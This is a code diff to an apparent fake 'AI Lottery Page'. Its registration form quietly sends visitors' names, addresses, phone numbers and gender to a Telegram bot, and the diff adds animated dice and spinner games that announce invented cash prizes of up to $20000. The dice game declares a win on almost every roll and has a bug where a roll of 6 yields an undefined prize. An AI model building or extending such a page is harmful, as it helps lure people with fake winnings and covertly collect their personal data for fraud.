@@ -8,8 +8,6 @@
         body {
             font-family: Arial, sans-serif;
             background-color: #f2f2f2;
-            margin: 0;
-            padding: 0;
             text-align: center;
         }
         h1 {
@@ -40,8 +38,32 @@
         .game-list button {
             background-color: #007BFF;
         }
-        canvas {
-            border: 2px solid black;
+        .dice, .spinner {
+            font-size: 50px;
+            margin: 20px auto;
+            color: #333;
+        }
+        .board-container {
+            position: relative;
+            margin: 20px auto;
+        }
+        #spinner {
+            width: 300px;
+            height: 300px;
+            border: 10px solid #ccc;
+            border-radius: 50%;
+            position: relative;
+        }
+        .pointer {
+            position: absolute;
+            top: -20px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 0;
+            height: 0;
+            border-left: 20px solid transparent;
+            border-right: 20px solid transparent;
+            border-bottom: 40px solid red;
         }
     </style>
 </head>
@@ -73,9 +95,15 @@
     </div>
 </div>
 
-<div id="gameContainer" class="container" style="display: none;">
-    <canvas id="prizeBoard" width="300" height="300" style="display: none;"></canvas>
-    <div id="gameResult" style="font-size: 18px; margin-top: 20px;"></div>
+<div class="container" id="gameContainer" style="display: none;">
+    <div id="gameResult" style="font-size: 18px;"></div>
+    <div class="dice" id="diceDisplay" style="display: none;"></div>
+
+    <!-- Spinner -->
+    <div class="board-container" id="spinnerContainer" style="display: none;">
+        <div class="pointer"></div>
+        <div id="spinner"></div>
+    </div>
 </div>
 
 <script>
@@ -95,51 +123,68 @@ document.getElementById('lotteryForm').addEventListener('submit', function (e) {
 
     const message = `New Lottery Registration:\nName: ${firstName} ${middleName} ${lastName}\nAddress: ${address}\nPhone: ${phone}\nGender: ${gender}`;
 
-    // Send message to Telegram
     fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-        }),
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message }),
     }).then(() => {
-        // Display Welcome Message
         document.getElementById('formContainer').style.display = 'none';
         document.getElementById('welcomeContainer').style.display = 'block';
         document.getElementById('welcomeMessage').innerHTML = 
             `Dear <b style="color: green;">${firstName} ${lastName}</b>, we welcome you to AI Lottery Page!`;
-    }).catch((error) => alert("Error submitting form: " + error));
+    });
 });
 
 // Rolling Dice Game
 function playDice() {
-    const result = Math.ceil(Math.random() * 6);
-    alert(`🎲 You rolled a ${result}`);
-    document.getElementById('gameResult').innerHTML = `You rolled: ${result}`;
+    document.getElementById('diceDisplay').style.display = 'block';
+    const diceElement = document.getElementById('diceDisplay');
+    let roll = 0;
+
+    const diceAnimation = setInterval(() => {
+        roll = Math.ceil(Math.random() * 6);
+        diceElement.innerHTML = `🎲 ${roll}`;
+    }, 100);
+
+    setTimeout(() => {
+        clearInterval(diceAnimation);
+        const prizes = ["$1000", "$2000", "$5000", "$10000", "$20000"];
+        const prize = prizes[roll - 1]; // Map roll to prize
+        document.getElementById('gameResult').innerHTML = 
+            `🎉 Congratulations! You rolled ${roll} and won ${prize}!`;
+    }, 3000);
 }
 
 // Spin the Board Game
 function playSpin() {
+    document.getElementById('spinnerContainer').style.display = 'block';
+    const spinner = document.getElementById('spinner');
     const prizes = ['$2000', '$5000', '$1000', '$15000', '$20000', '$30000', 'Try Again'];
-    let index = 0;
+    let rotation = 0;
 
     const spinAnimation = setInterval(() => {
-        index = (index + 1) % prizes.length;
-        document.getElementById('gameResult').innerHTML = `Spinning... ${prizes[index]}`;
-    }, 100);
+        rotation += 10;
+        spinner.style.transform = `rotate(${rotation}deg)`;
+    }, 50);
 
     setTimeout(() => {
         clearInterval(spinAnimation);
-        const finalPrize = prizes[Math.floor(Math.random() * prizes.length)];
-        if (finalPrize === 'Try Again') {
-            alert('Try Again!');
-        } else {
-            alert(`🎉 Congratulations! You won ${finalPrize}`);
-        }
-        document.getElementById('gameResult').innerHTML = `Result: ${finalPrize}`;
+        const finalIndex = Math.floor(Math.random() * prizes.length);
+        const finalPrize = prizes[finalIndex];
+        const stopRotation = rotation + (360 / prizes.length) * finalIndex;
+        spinner.style.transform = `rotate(${stopRotation}deg)`;
+
+        setTimeout(() => {
+            if (finalPrize === 'Try Again') {
+                alert('Try Again!');
+            } else {
+                alert(`🎉 Congratulations! You won ${finalPrize}`);
+            }
+            document.getElementById('gameResult').innerHTML = `Result: ${finalPrize}`;
+        }, 500);
     }, 5000);
 }
 </script>
+
 </body>
 </html>
